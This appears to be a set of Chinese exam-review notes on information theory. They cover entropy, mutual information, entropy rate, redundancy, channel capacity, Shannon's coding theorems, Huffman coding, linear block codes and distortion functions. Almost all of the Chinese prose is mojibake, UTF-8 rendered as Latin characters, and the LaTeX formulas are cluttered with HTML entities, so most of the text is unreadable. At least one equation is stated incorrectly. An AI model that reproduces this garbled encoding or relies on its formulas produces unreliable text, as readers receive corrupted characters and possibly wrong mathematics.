$p(x_i)&#x3D;0,\\implies I(x_i)\\to \\infin$ ; $p(x_i)&#x3D;1, \\implies I(x_i)&#x3D;0$ ä¿¡æ¯é‡å¯åŠ  è®¾éšæœºäº‹ä»¶ $x_i$ å‘ç”Ÿçš„æ¦‚ç‡ä¸º $p(x_i)$ ï¼Œåˆ™å®ƒçš„ä¿¡æ¯é‡å®šä¹‰ä¸º $I(x_i)&#x3D;-log\\ p(x_i)\\ &#x3D;log\\ \\frac{1}{p(x_i)}$ $I(x_i)$çš„å«ä¹‰ äº‹ä»¶å‘ç”Ÿä»¥å‰ &#x3D; äº‹ä»¶å‘ç”Ÿçš„ä¸ç¡®å®šæ€§çš„å¤§å° äº‹ä»¶å‘ç”Ÿä»¥å &#x3D; äº‹ä»¶æ‰€å«æœ‰çš„ä¿¡æ¯é‡ äº’ä¿¡æ¯ä¸€ä¸ªäº‹ä»¶ $y_i$ æ‰€ç»™å‡ºå…³äºå¦ä¸€ä¸ªäº‹ä»¶ $x_i$ çš„ä¿¡æ¯å®šä¹‰ä¸ºäº’ä¿¡æ¯ï¼Œç”¨ $I(x_i;y_i)$ è¡¨ç¤º $I(x_i;y_i)&#x3D;I(x_i)-I(x_i|y_i)&#x3D;log\\frac{p(x_i|y_i)}{p(x_i)}$ äº’ä¿¡æ¯ $I(x_i;y_i)$ æ˜¯ å·²çŸ¥äº‹ä»¶ $y_i$ åæ‰€æ¶ˆé™¤çš„å…³äºäº‹ä»¶ $x_i$ çš„ä¸ç¡®å®šæ€§ ğŸ”† å¹³å‡è‡ªä¿¡æ¯ H(X) â€” ä¿¡æ¯ç†µä¿¡æ¯ç†µåªä¼šå‡å°‘ï¼Œä¸ä¼šå¢åŠ ã€‚æ˜¯å¯¹ä¿¡æºçš„å¹³å‡ä¸ç¡®å®šæ€§çš„æè¿° å¹³å‡è‡ªä¿¡æ¯é‡è¡¨å¾æ•´ä¸ªä¿¡æºçš„ä¸ç¡®å®šåº¦ï¼Œåˆç§°ä¿¡æ¯ç†µã€ä¿¡æºç†µã€ç®€ç§°ç†µ ä¸€ä¸ªéšæœºå˜é‡çš„æ‰€æœ‰å¯èƒ½çš„å–å€¼å’Œè¿™äº›å–å€¼å¯¹åº”çš„æ¦‚ç‡ $[X,P(X)]$ ç§°ä¸ºå®ƒçš„æ¦‚ç‡ç©ºé—´ éšæœºå˜é‡ $X$ çš„æ¯ä¸€ä¸ªå¯èƒ½å–å€¼çš„è‡ªä¿¡æ¯ $I(x_i)$ çš„ç»Ÿè®¡å¹³å‡å€¼å®šä¹‰ä¸ºéšæœºå˜é‡ $X$çš„å¹³å‡è‡ªä¿¡æ¯é‡ $H(X)&#x3D;E\\ [\\ I(x_i)\\ ] &#x3D; -\\sum^{q}_{i&#x3D;1}p(x_i)\\ log\\ p(x_i)$ $q$ ä¸º $X$ çš„æ‰€æœ‰å¯èƒ½å–å€¼çš„ä¸ªæ•° ç†µæœ‰ä»€ä¹ˆä½œç”¨ ä¿¡æºç¼–ç å®šç† å®šé•¿ä¿¡æºç¼–ç å®šç†ç»™å‡ºäº†å®šé•¿ç¼–ç æ—¶æ¯ä¸ªä¿¡æºç¬¦å·æœ€å°‘æ‰€éœ€çš„ç ç¬¦å·çš„ç†è®ºæé™ï¼Œè¯¥å€¼ç”± $H(S)$ å†³å®šã€‚ ç†µå‡½æ•°çš„æ€§è´¨ è”åˆç†µä¸æ¡ä»¶ç†µäºŒç»´éšæœºå˜é‡XYçš„è”åˆç†µå®šä¹‰ä¸ºè”åˆè‡ªä¿¡æ¯çš„æ•°å­¦æœŸæœ›ï¼Œå®ƒæ˜¯äºŒç»´éšæœºå˜é‡XYçš„ä¸ç¡®å®šæ€§åº¦é‡ã€‚ å¯¹è”åˆç†µçš„æ‰€æœ‰å¯èƒ½å€¼è¿›è¡Œç»Ÿè®¡å¹³å‡ï¼Œå¾—å‡ºç»™å®šXæ—¶ï¼ŒYçš„æ¡ä»¶ç†µ $H(Y|X)$ ç†µå‡½æ•°çš„é“¾è§„åˆ™ ğŸ”† å¹³å‡äº’ä¿¡æ¯ $I(X;Y)$ å¹³å‡äº’ä¿¡æ¯çš„ä½œç”¨ ä¿¡é“å®¹é‡ä¸ºå¹³å‡äº’ä¿¡æ¯å¯¹äºè¾“å…¥æ¦‚ç‡åˆ†å¸ƒçš„æœ€å¤§å€¼å½“ä¿¡é“è¾“å…¥ç­‰æ¦‚åˆ†å¸ƒæ—¶ï¼Œè¾“å‡ºä¹Ÿä¸ºç­‰æ¦‚åˆ†å¸ƒï¼Œä¿¡é“è¾¾åˆ°ä¿¡é“å®¹é‡ï¼Œä¹Ÿå°±æ˜¯æœ€å¤§ã€‚ å¹³å‡äº’ä¿¡æ¯ $I(X;Y)$ æ˜¯ä¿¡æºæ¦‚ç‡åˆ†å¸ƒ $p(x_i)$ çš„ä¸Šå‡¸å‡½æ•°ï¼Œåˆæ˜¯ä¿¡é“ä¼ é€’æ¦‚ç‡ $p(y_j,x_i)$ çš„ä¸‹å‡¸å‡½æ•°ï¼Œå› æ­¤ä¿¡é“å®¹é‡ $C$ å’Œä¿¡æ¯å¤±çœŸå‡½æ•° $R(D)$ å…·æœ‰å¯¹å¶æ€§ã€‚ ç¬¬ä¸‰ç«  ä¿¡æº ä¿¡æºç†µ è€ƒç‚¹ç¦»æ•£å¹³ç¨³ï¼Œä»€ä¹ˆå«å¹³ç¨³æ€§ã€æ— è®°å¿†æ€§ P26 âœ… å‡è®¾æ˜¯è¿™ç§ä¿¡æºï¼Œå°±ç»™äº†æ¡ä»¶ P27 æé™ç†µ å®šä¹‰æ˜¯ä»€ä¹ˆ âœ… å¹³å‡ç¬¦å·ç†µ âœ… åˆ†æˆä¸åŒçš„ä¿¡æºï¼Œå°±æ˜¯å¯¹åº”ä¸åŒçš„å‡è®¾ï¼Œæ€ä¹ˆè®¡ç®—æé™ç†µï¼ˆå…¶å®å°±æ˜¯ä¿¡æºç†µï¼‰ âœ…é©¬å°”å¤šå¤«ä¿¡æº äº†è§£ä¸€ä¸‹ âœ… P35 å‰©ä½™åº¦ âœ… ä¿¡æºçš„åˆ†ç±»ï¼ˆæ ¹æ®ç¦»æ•£è¿˜æ˜¯è¿ç»­ï¼‰ç¦»æ•£ä¿¡æºï¼ˆæ•°å­—ä¿¡æºï¼‰ ç¦»æ•£éšæœºå˜é‡åºåˆ—ã€‚æ–‡å­—ã€æ•°æ®ã€ç¦»æ•£åŒ–å›¾åƒ è¿ç»­ä¿¡æº è¿ç»­éšæœºå˜é‡åºåˆ—ã€‚å¤šäººè·³è¿œæ¯”èµ›çš„ç»“æœï¼Œè¯­éŸ³ä¿¡å·æŠ½æ ·ä»¥å æ³¢å½¢ä¿¡æºï¼ˆæ¨¡æ‹Ÿä¿¡æºï¼‰â€” è¿ç»­ è¯­éŸ³ã€éŸ³ä¹ã€çƒ­å™ªå£°ã€å›¾åƒã€å›¾å½¢ ä¿¡æºçš„åˆ†ç±»ï¼ˆæ ¹æ®æ¦‚ç‡åˆ†å¸ƒï¼‰æ ¹æ®æ¦‚ç‡åˆ†å¸ƒæ˜¯å¦éšæ—¶é—´çš„æ¨ç§»è€Œå˜åŒ– å¹³ç¨³ä¿¡æº ç¦»æ•£å¹³ç¨³ä¿¡æºï¼šä¿¡æºçš„æ¦‚ç‡åˆ†å¸ƒä¸äº‹ä»¶æ— å…³ å„ç»´è”åˆæ¦‚ç‡åˆ†å¸ƒå‡ä¸æ—¶é—´èµ·ç‚¹æ— å…³çš„ä¿¡æºï¼Œç§°ä¸ºç¦»æ•£å¹³ç¨³ä¿¡æº éå¹³ç¨³ä¿¡æº ä¿¡æºçš„åˆ†ç±»ï¼ˆæ ¹æ®ç»Ÿè®¡ç‹¬ç«‹ï¼‰æ ¹æ®éšæœºå˜é‡é—´æ˜¯å¦ç»Ÿè®¡ç‹¬ç«‹ æ— è®°å¿†ä¿¡æº ç¦»æ•£å¹³ç¨³æ— è®°å¿†ä¿¡æºè¾“å‡ºçš„ç¬¦å·åºåˆ—æ˜¯å¹³ç¨³éšæœºåºåˆ—ï¼Œä¸”ç¬¦å·ä¹‹é—´æ˜¯æ— å…³çš„ï¼Œå³ç»Ÿè®¡ç‹¬ç«‹çš„ã€‚ä¸åŒæ—¶åˆ»å‘å‡ºçš„æ¶ˆæ¯æ˜¯ç‹¬ç«‹çš„ æ— è®°å¿†å¹³ç¨³ä¿¡æºï¼Œè¾“å‡ºNé•¿ç¬¦å·åºåˆ—çš„ä¿¡æºè®°ä¸ºï¼š $X&#x3D;X_1X_2â€¦X_N&#x3D;X^N$ å…³ç³»ï¼š $H(X)&#x3D;H(X^N)&#x3D;NH(X)$ ç¦»æ•£å¹³ç¨³æ— è®°å¿†ä¿¡æºçš„ç†µç‡ï¼š $H_{\\infin}&#x3D;lim_{N\\to \\infin}H_N(X)&#x3D;lim_{N\\to\\infin}\\frac{1}{N}Â·NH(X)&#x3D;H(X)$ æœ‰è®°å¿†ä¿¡æº æ¯ä¸ªéšæœºå˜é‡ä¹‹é—´å­˜åœ¨ç»Ÿè®¡ä¾èµ–å…³ç³» æé™ç†µï¼ˆç†µç‡ï¼‰ç†µç‡ï¼šä¿¡æºè¾“å‡ºçš„ç¬¦å·åºåˆ—ä¸­ï¼Œå¹³å‡æ¯ä¸ªç¬¦å·æ‰€æºå¸¦çš„ä¿¡æ¯é‡ å¹³å‡ç¬¦å·ç†µï¼šéšæœºå˜é‡åºåˆ—ä¸­ï¼Œå¯¹å‰Nä¸ªéšæœºå˜é‡çš„è”åˆç†µæ±‚å¹³å‡ï¼š $H_N(X)&#x3D;\\frac{1}{N}H(X_1X_2â€¦X_N)$ å½“ $N\\to \\infin$ æ—¶ï¼Œä¸Šå¼æé™å­˜åœ¨ï¼Œåˆ™ $lim_{N\\to \\infin}H_N(X)$ ç§°ä¸ºç†µç‡ï¼Œæˆ–æé™ç†µ $H_{\\infin} &#x3D; lim_{N\\to \\infin}H_N(X)$ é©¬å°”å¯å¤«ä¿¡æºæœ‰ä¸€ç±»ä¿¡æºï¼Œåœ¨æŸæ—¶åˆ»å‘å‡ºçš„ç¬¦å·ä»…ä¸åœ¨æ­¤ä¹‹å‰å‘å‡ºçš„æœ‰é™ä¸ªç¬¦å·æœ‰å…³ï¼Œè€Œä¸æ›´æ—©äº›æ—¶å€™å‘å‡ºçš„ç¬¦å·æ— å…³ï¼Œè¿™ç§°ä¸ºé©¬å°”å¯å¤«æ€§ï¼Œè¿™ç±»ä¿¡æºç§°ä¸ºé©¬å°”å¯å¤«ä¿¡æº å‰©ä½™åº¦ä¸€ä¸ªä¿¡æºçš„æé™ç†µä¸å…·æœ‰ç›¸åŒç¬¦å·é›†çš„æœ€å¤§ç†µçš„æ¯”å€¼ç§°ä¸ºç†µçš„ç›¸å¯¹ç‡ $\\eta&#x3D;\\frac{H_{\\infin}}{H_0}$ ï¼Œä¿¡æºå‰©ä½™åº¦ $\\gamma &#x3D;1-\\eta&#x3D;1-\\frac{H_\\infin}{log_2q}$ ï¼Œ $H_0-H_\\infin$ è¶Šå¤§ï¼Œä¿¡æºçš„å‰©ä½™åº¦è¶Šå¤§ã€‚ ä¿¡æºçš„å‰©ä½™åº¦æ¥è‡ªä¸¤ä¸ªæ–¹é¢ï¼š ä¿¡æºç¬¦å·é—´çš„ç›¸å…³æ€§ï¼Œç›¸å…³ç¨‹åº¦è¶Šå¤§ï¼Œç¬¦å·é—´çš„ä¾èµ–å…³ç³»è¶Šé•¿ï¼Œä¿¡æºçš„ $H_\\infin$ è¶Šå° ä¿¡æºè¾“å‡ºæ¶ˆæ¯çš„ä¸ç­‰æ¦‚åˆ†å¸ƒä½¿ä¿¡æºçš„ $H_\\infin$ å‡å° å½“ä¿¡æºè¾“å‡ºç¬¦å·é—´ä¸å­˜åœ¨ç›¸å…³æ€§ï¼Œä¸”è¾“å‡ºæ¶ˆæ¯ä¸ºç­‰æ¦‚åˆ†å¸ƒæ—¶ï¼Œä¿¡æºçš„ $H_\\infin$ æœ€å¤§ï¼Œç­‰äº $H_0$ ä¸ºæœ‰æ•ˆä¼ é€’ä¿¡æ¯ï¼Œè¦å‹ç¼©ä¿¡æºå‰©ä½™åº¦ï¼Œæ–¹æ³•æ˜¯å‡å°‘ç¬¦å·é—´çš„ç›¸å…³æ€§ï¼Œå¹¶å°½å¯èƒ½çš„ä½¿ä¿¡æºè¾“å‡ºæ¶ˆæ¯ç­‰æ¦‚åˆ†å¸ƒ ç¬¬å››ç«  ä¿¡é“å®¹é‡ï¼ˆå’Œäº’ä¿¡æ¯æœ‰å…³ç³»ï¼‰ è€ƒç‚¹4.1 4.2 4.3 4.4 å¹³ç¨³ã€æ— è®°å¿†ã€æœ‰è®°å¿†æ˜¯ä»€ä¹ˆ âœ… P49 å…ˆéªŒæ¦‚ç‡ã€åéªŒæ¦‚ç‡å®¹æ˜“æ··æ·†ã€‚xyzæ˜¯ä¿¡é“å®¹é‡ã€‚çŸ¥é“ä»€ä¹ˆæ˜¯å…ˆéªŒæ¦‚ç‡ä»€ä¹ˆæ˜¯åéªŒæ¦‚ç‡ âœ… pxiå…ˆéªŒæ¦‚ç‡ pyjåéªŒæ¦‚ç‡ ä¿¡é“å®¹é‡ 4.2.2 âœ… ä¿¡é“å®¹é‡æ˜¯å¹³å‡äº’ä¿¡æ¯ã€‚ã€‚ã€‚ã€‚ã€‚å“ªä¸€ç§æ¦‚ç‡åˆ†å¸ƒå¯ä»¥ä½¿å¾—xyæœ€å¤§ã€‚ è®¡ç®—ä¿¡é“å®¹é‡ ä¿¡é“åˆ†ç±»æ— è®°å¿†ä¿¡é“ ä¿¡é“çš„è¾“å‡ºåªä¸ä¿¡é“è¯¥æ—¶åˆ»çš„è¾“å…¥æœ‰å…³è€Œä¸å…¶ä»–æ—¶åˆ»çš„è¾“å…¥ã€è¾“å‡ºæ— å…³ æœ‰è®°å¿†ä¿¡é“ ä¿¡é“çš„è¾“å‡ºä¸å…¶ä»–æ—¶åˆ»çš„è¾“å…¥è¾“å‡ºæœ‰å…³ï¼Œä¿¡é“ä¸­çš„è®°å¿†ç°è±¡æ¥æºäºç‰©ç†ä¿¡é“ä¸­çš„æƒ¯æ€§ï¼Œå¦‚ç”µæ„Ÿç”µå®¹ç­‰ å¹³ç¨³ä¿¡é“ï¼ˆæ’å‚ä¿¡é“ï¼‰ ä¿¡é“çš„ç»Ÿè®¡ç‰¹æ€§ä¸éšæ—¶é—´å˜åŒ– éå¹³ç¨³ä¿¡é“ï¼ˆéšå‚ä¿¡é“ï¼‰ ä¿¡é“çš„ç»Ÿè®¡ç‰¹æ€§éšæ—¶é—´å˜åŒ– å…ˆéªŒæ¦‚ç‡ã€åéªŒæ¦‚ç‡ ä¿¡é“å®¹é‡ä¿¡é“å®¹é‡ä¸ºå¹³å‡äº’ä¿¡æ¯å¯¹äºè¾“å…¥æ¦‚ç‡åˆ†å¸ƒçš„æœ€å¤§å€¼å½“ä¿¡é“è¾“å…¥ç­‰æ¦‚åˆ†å¸ƒæ—¶ï¼Œè¾“å‡ºä¹Ÿä¸ºç­‰æ¦‚åˆ†å¸ƒï¼Œä¿¡é“è¾¾åˆ°ä¿¡é“å®¹é‡ï¼Œä¹Ÿå°±æ˜¯æœ€å¤§ã€‚ å¯¹äºå›ºå®šçš„ä¿¡é“ï¼Œæ€»å­˜åœ¨ä¸€ç§æ¦‚ç‡ä¿¡æºï¼ˆæŸç§è¾“å…¥æ¦‚ç‡åˆ†å¸ƒï¼‰ä½¿ä¿¡é“ä¼ è¾“ä¸€ä¸ªç¬¦å·æ¥æ”¶ç«¯è·å¾—çš„å¹³å‡ä¿¡æ¯é‡æœ€å¤§ï¼Œä¹Ÿå°±æ˜¯è¯´å¯¹äºæ¯ä¸ªå›ºå®šä¿¡é“éƒ½æœ‰ä¸€ä¸ªæœ€å¤§çš„ä¿¡æ¯ä¼ è¾“ç‡ï¼Œè¿™ä¸ªæœ€å¤§ä¿¡æ¯ä¼ è¾“ç‡å³ä¸ºä¿¡é“å®¹é‡ã€‚ è®¡ç®—ä¿¡é“å®¹é‡ ç¬¬äº”ç«  ä¿¡æºç¼–ç  è€ƒç‚¹5.1 5.2 5.3 5.4 å®šç†ï¼Œè¦çŸ¥é“å®šç†çš„å†…å®¹ã€‚é¦™å†œç¬¬ä¸€ç¬¬äºŒç¬¬ä¸‰å®šç†ã€‚å®šç†è§£å†³äº†ä»€ä¹ˆæ ·çš„é—®é¢˜ã€‚æœ€å¥½çŸ¥é“æ€ä¹ˆæ¨å¯¼çš„ âœ… ç¼–ç ï¼šé¦™å†œç¼–ç ã€éœå¤«æ›¼ç¼–ç  âœ… å®šç†å®šé•¿ç åŠå®šé•¿ä¿¡æºç¼–ç å®šç† ç”¨ä»¥å®ç°æ— å¤±çœŸçš„ç¼–ç ï¼Œæ‰€ç¼–çš„ç å¿…é¡»æ˜¯å”¯ä¸€å¯è¯‘ç ã€‚æ ¹æ®å®šé•¿ä¿¡æºç¼–ç å®šç†ï¼Œæ¯ä¸ªä¿¡æºç¬¦å·å¹³å‡æ‰€éœ€çš„äºŒå…ƒç ç¬¦å·å¯å¤§å¤§å‡å°‘ï¼Œä»è€Œä½¿ç¼–ç æ•ˆç‡æé«˜ã€‚ å®šé•¿ä¿¡æºç¼–ç å®šç†ç»™å‡ºäº†å®šé•¿ç¼–ç æ—¶æ¯ä¸ªä¿¡æºç¬¦å·æœ€å°‘æ‰€éœ€çš„ç ç¬¦å·çš„ç†è®ºæé™ï¼Œè¯¥å€¼ç”± $H(S)$ å†³å®šã€‚ å¯¹å®šé•¿ç æ¥è¯´ï¼Œè‹¥å®šé•¿ç æ˜¯éå¥‡å¼‚ç ã€‚åˆ™å®ƒçš„ä»»æ„æœ‰é™é•¿ $N$ æ¬¡æ‰©å±•ç ä¸€å®šä¹Ÿæ˜¯éå¥‡å¼‚ç ï¼Œå› æ­¤å®šé•¿éå¥‡å¼‚ç ä¸€å®šæ˜¯å”¯ä¸€å¯è¯‘ç ã€‚ å˜é•¿ç å’Œå˜é•¿ä¿¡æºç¼–ç å®šç† å˜é•¿ç è¦æˆä¸ºå”¯ä¸€å¯è¯‘ç ä¸ä»…æœ¬èº«åº”æ˜¯éå¥‡å¼‚çš„ï¼Œè€Œä¸”å®ƒçš„æœ‰é™é•¿ $N$ æ¬¡æ‰©å±•ç ä¹Ÿåº”æ˜¯éå¥‡å¼‚çš„ã€‚ ç´§è‡´ç å¹³å‡ç é•¿ç•Œé™å®šç† å¯¹åŒä¸€ä¿¡æºç”¨åŒä¸€ç ç¬¦å·é›†ç¼–æˆçš„å³æ—¶ç æˆ–å”¯ä¸€å¯è¯‘ç å¯æœ‰å¾ˆå¤šç§ã€‚ä»é«˜æ•ˆä¼ è¾“ä¿¡æ¯çš„è§’åº¦ï¼Œè¦é€‰æ‹©ç ç¬¦å·åºåˆ—é•¿åº¦è¾ƒçŸ­çš„ç å­—ï¼Œä¹Ÿå°±æ˜¯é‡‡ç”¨ç é•¿è¾ƒçŸ­çš„ç å­—ï¼Œæ‰€ä»¥æœ‰äº†ç çš„å¹³å‡é•¿åº¦ æ— å¤±çœŸå˜é•¿ä¿¡æºç¼–ç å®šç†ï¼ˆé¦™å†œç¬¬ä¸€å®šç†ï¼‰â€”â€” æ”¹è¿›ä¿¡æºç¼–ç ä¿¡æºçš„ä¿¡æ¯ç†µæ˜¯æ— å¤±çœŸä¿¡æºç¼–ç å¹³å‡ç é•¿çš„æé™å€¼ï¼Œä¹Ÿå¯ä»¥è®¤ä¸ºä¿¡æºçš„ä¿¡æ¯ç†µæ˜¯è¡¨ç¤ºæ¯ä¸ªä¿¡æºç¬¦å·å¹³å‡æ‰€éœ€æœ€å°‘çš„äºŒå…ƒç ç¬¦å·æ•° è¦åšåˆ°æ— å¤±çœŸä¿¡æºç¼–ç ï¼Œæ¯ä¸ªä¿¡æºç¬¦å·å¹³å‡æ‰€éœ€æœ€å°‘çš„ $r$ å…ƒç ç¬¦å·æ•°å°±æ˜¯ä¿¡æºçš„ç†µå€¼ã€‚è‹¥ç¼–ç çš„å¹³å‡ç é•¿å°äºä¿¡æºçš„ç†µå€¼ï¼Œåˆ™å”¯ä¸€å¯è¯‘ç ä¸å­˜åœ¨ï¼Œåœ¨è¯‘ç æ—¶å¿…ç„¶å¸¦æ¥å¤±çœŸæˆ–å·®é”™ã€‚ é€šè¿‡å¯¹æ‰©å±•ä¿¡æºè¿›è¡Œå˜é•¿ç¼–ç ï¼Œå½“ $N \\to \\infin$ æ—¶ï¼Œå¹³å‡ç é•¿ $\\frac{\\bar{L_N}}{N}$ å¯è¾¾åˆ°è¿™ä¸ªæé™å€¼ é¦™å†œç¼–ç  äºŒå…ƒéœå¤«æ›¼ç¼–ç  éœå¤«æ›¼ç ç¼–ç æ–¹æ³•ï¼Œå¾—åˆ°çš„ç ä¸æ˜¯å”¯ä¸€çš„ æ¯æ¬¡å¯¹ä¿¡æºç¼©å‡æ—¶ï¼Œæ¦‚ç‡æœ€å°çš„ä¸¤ä¸ªä¿¡æºç¬¦å·å¯¹åº”çš„ç ç¬¦å·0å’Œ1æ˜¯å¯ä»¥äº’æ¢çš„ï¼Œæ‰€ä»¥å¯å¾—åˆ°ä¸åŒçš„éœå¤«æ›¼ç  å¯¹ä¿¡æºè¿›è¡Œç¼©å‡æ—¶ï¼Œå¦‚æœä¸¤ä¸ªæ¦‚ç‡æœ€å°çš„ä¿¡æºç¬¦å·åˆå¹¶åçš„æ¦‚ç‡ä¸å…¶ä»–ä¿¡æºç¬¦å·çš„æ¦‚ç‡ç›¸åŒï¼Œåˆ™åœ¨ç¼©å‡ä¿¡æºä¸­è¿›è¡Œæ¦‚ç‡æ’åºçš„æ¬¡åºå¯ä»¥æ˜¯ä»»æ„çš„ï¼Œå› æ­¤ä¼šå¾—åˆ°ä¸åŒçš„éœå¤«æ›¼ç ã€‚ éœå¤«æ›¼ç¼–ç çš„ç‰¹ç‚¹ éœå¤«æ›¼ç æ˜¯ç”¨æ¦‚ç‡åŒ¹é…çš„æ–¹æ³•è¿›è¡Œä¿¡æºç¼–ç ï¼Œå®ƒçš„ç‰¹ç‚¹ä¿è¯äº†éœå¤«æ›¼ç ä¸€å®šæ˜¯æœ€ä½³ç ã€‚ç‰¹ç‚¹å¦‚ä¸‹ï¼š éœå¤«æ›¼ç çš„ç¼–ç æ–¹æ³•ä¿è¯äº†æ¦‚ç‡å¤§çš„ä¿¡æºç¬¦å·å¯¹åº”äºçŸ­ç ï¼Œæ¦‚ç‡å°çš„ä¿¡æºç¬¦å·å¯¹åº”äºé•¿ç ï¼Œå……åˆ†åˆ©ç”¨çŸ­ç  æ¯æ¬¡ç¼©å‡ä¿¡æºçš„æœ€åä¸¤ä¸ªç å­—æœ‰ç›¸åŒçš„ç é•¿ï¼Œå¹¶ä¸”æ€»æ˜¯æœ€åä¸€ä½ç å…ƒä¸åŒï¼Œå‰é¢å„ä½ç å…ƒç›¸åŒ ç¬¬å…­ç«  ä¿¡é“ç¼–ç  è€ƒç‚¹é™¤å·ç§¯ç éƒ½çœ‹ çº¿æ€§ç ï¼Œnk éƒ½ä»£è¡¨ä»€ä¹ˆ ç¼–ç å®šç† é¦™å†œç¬¬äºŒå®šç† çº¿æ€§ä»£æ•°å’Œç¼–ç æ€ä¹ˆå¯¹åº”èµ·æ¥çš„ã€‚æ€ä¹ˆç”¨çº¿æ€§ä»£æ•°è§£å†³ç¼–ç çš„é—®é¢˜ã€‚ ä¿¡é“ç¼–ç å®šç†ï¼ˆé¦™å†œç¬¬äºŒå®šç†ï¼‰â€” æ”¹è¿›ä¿¡é“ç¼–ç ä¿¡é“ä¸­å­˜åœ¨å™ªå£°æˆ–å¹²æ‰°ï¼Œä¿¡æ¯ä¼ è¾“ä¼šé€ æˆæŸå¤±ã€‚ ä¿¡é“ä¸­æ— é”™è¯¯ä¼ è¾“çš„æœ€å¤§ä¿¡æ¯ä¼ è¾“ç‡ï¼Œè¿™ä¸ªæé™å°±æ˜¯é¦™å†œç¬¬äºŒå®šç†ã€‚ä¼ é€æ¶ˆæ¯åœ¨ä¼ é€å‰äº‹å…ˆç¼–ç ï¼Œæ¥æ”¶ç«¯é‡‡ç”¨é€‚å½“æ–¹æ³•è¯‘ç ï¼Œå¯ä»¥å®ç°é€šè¿‡ä¸å¯é ä¿¡é“å®ç°å¯é çš„ä¿¡æ¯ä¼ è¾“ã€‚ é”™è¯¯æ¦‚ç‡ä¸ä¿¡é“çš„ç»Ÿè®¡ç‰¹æ€§æœ‰å…³ã€‚ä¿¡é“çš„ç»Ÿè®¡ç‰¹æ€§å¯ç”±ä¿¡é“çŸ©é˜µæ¥è¡¨ç¤ºï¼Œç”±ä¿¡é“çŸ©é˜µå°±å¯ä»¥æ±‚å‡ºé”™è¯¯æ¦‚ç‡ã€‚ çº¿æ€§ç åˆ†ç»„ç ï¼šæŠŠä¿¡æ¯åºåˆ—ä»¥æ¯ $k$ ä¸ªç å…ƒåˆ†ç»„ï¼Œç„¶åæŠŠæ¯ç»„ $k$ ä¸ªä¿¡æ¯å…ƒæŒ‰ä¸€å®šè§„å¾‹äº§ç”Ÿ $r$ ä¸ªå¤šä½™çš„æ ¡éªŒå…ƒï¼Œè¾“å‡ºåºåˆ—æ¯ç»„é•¿ä¸º $n&#x3D;k+r$ ã€‚æ¯ä¸€ç å­—çš„ $r$ ä¸ªæ ¡éªŒå…ƒåªä¸æœ¬ç»„çš„ $k$ ä¸ªä¿¡æ¯å…ƒæœ‰å…³ï¼Œä¸åˆ«çš„åˆ†ç»„çš„ä¿¡æ¯ä½æ— å…³ï¼Œè®°ä¸ºåˆ†ç»„ç  $(n,k)$ æ ‘ç ï¼šä¿¡æ¯åºåˆ—ä»¥æ¯ $k_0$ ä¸ªç å…ƒåˆ†æ®µï¼Œç¼–ç å™¨è¾“å‡ºè¯¥æ®µçš„æ ¡éªŒå…ƒä¸ä»…ä¸æœ¬æ®µçš„ $k_0$ ä¸ªä¿¡æ¯å…ƒæœ‰å…³ï¼Œè€Œä¸”è¿˜ä¸å…¶å‰é¢è‹¥å¹²æ®µçš„ä¿¡æ¯å…ƒæœ‰å…³ï¼Œç§°ä¸ºæ ‘ç æˆ–é“¾ç ï¼Œå·ç§¯ç ï¼Œå®ƒçš„æ ¡éªŒå…ƒä¸ä¿¡æ¯å…ƒçš„å…³ç³»æ˜¯çº¿æ€§å…³ç³» $(n,k)$ çº¿æ€§åˆ†ç»„ç æ˜¯ $n$ ç»´ $n$ é•¿å‘é‡æ„æˆçš„çº¿æ€§ç©ºé—´ä¸­ä¸€ä¸ª $k$ ç»´çº¿æ€§å­ç©ºé—´ çº¿æ€§åˆ†ç»„ç çš„æ€§è´¨ ç ä¸­ä»»æ„ä¸¤ä¸ªç å­—ä¹‹å’Œä»ä¸ºä¸€ç å­— ä»»æ„ç å­—æ˜¯ $\\bold{G}$ çš„è¡Œå‘é‡ $G_1,G_2,â€¦,G_k$ çš„çº¿æ€§ç»„åˆ é›¶å‘é‡ $\\bold{0}&#x3D;(0,0,â€¦.,0)$ æ˜¯ä¸€ä¸ªç å­—ï¼Œç§°ä¸ºé›¶ç å­— çº¿æ€§åˆ†ç»„ç çš„æœ€å°è·ç¦»ç­‰äºéé›¶ç å­—çš„æœ€å°é‡é‡ çº¿æ€§åˆ†ç»„ç æœ€é‡è¦çš„æ€§è´¨æ˜¯å…¶çº¿æ€§ç‰¹æ€§ä»¥åŠåœ¨æ­¤åŸºç¡€ä¸Šçš„å¯¹ç§°æ€§ã€‚ çº¿æ€§ç‰¹æ€§æ˜¯æŒ‡çº¿æ€§ç ä¸­ä»»æ„ä¸¤ä¸ª ç å­—çš„å’Œæˆ–å·®ä»ä¸ºä¸€ç å­—ã€‚ å¯¹ç§°æ€§æ˜¯æŒ‡æˆ‘ä»¬åœ¨ä¸€ä¸ªç çš„æ‰€æœ‰ç å­—ä¸Šå‡å»ä¸€ä¸ªç‰¹å®šçš„ç å­—ï¼Œç»“æœä»æ˜¯åŒä¸€ç çš„å…¨éƒ¨ç å­— çº¿æ€§åˆ†ç»„ç çš„æœ€å°Hammingè·ç¦»ç­‰äºå…¶éé›¶ç å­—çš„æœ€å°Hammingé‡é‡ å¯¹äºä»»ä½•çº¿æ€§åˆ†ç»„ç ï¼Œç å­—çš„é‡é‡æˆ–å…¨éƒ¨ä¸ºå¶æ•°ï¼Œæˆ–å¥‡æ•°é‡é‡çš„ç å­—æ•°ä¸ºå¶æ•° ç¬¬ä¸ƒç«  è€ƒç‚¹7.1 7.2 7.3 7.4 ï¼ˆé¢„ï¼‰å¤±çœŸå‡½æ•°çš„å®šä¹‰ï¼Œå¹³å‡å¤±çœŸåº¦ï¼Œå¹³å‡å¤±çœŸçš„æ¦‚å¿µ æ¦‚ç‡ç¼–ç å®šä¹‰ï¼Œæ¦‚å¿µã€‚çŸ¥é“ä¾‹é¢˜å’Œä¹ é¢˜æ€ä¹ˆåš å¤±çœŸå‡½æ•°å¤±çœŸå‡½æ•°çš„å®šä¹‰ å¤±çœŸå‡½æ•°æ˜¯æ ¹æ®äººä»¬çš„å®é™…éœ€è¦å’Œå¤±çœŸå¼•èµ·çš„æŸå¤±ã€é£é™©å¤§å°ç­‰äººä¸ºè§„å®šçš„ å¯¹äºæ¯ä¸€å¯¹ $(x_i,y_j)$ æŒ‡å®šä¸€ä¸ªéè´Ÿçš„å‡½æ•° $d(x_i,y_j)\\ge0,\\ i&#x3D;1,2,â€¦.,s$ ï¼Œè¡¨ç¤ºä¿¡æºå‘å‡ºä¸€ä¸ªç¬¦å· $x_i$ ï¼Œè€Œåœ¨æ¥æ”¶ç«¯å†ç°ä¸º $y_i$ 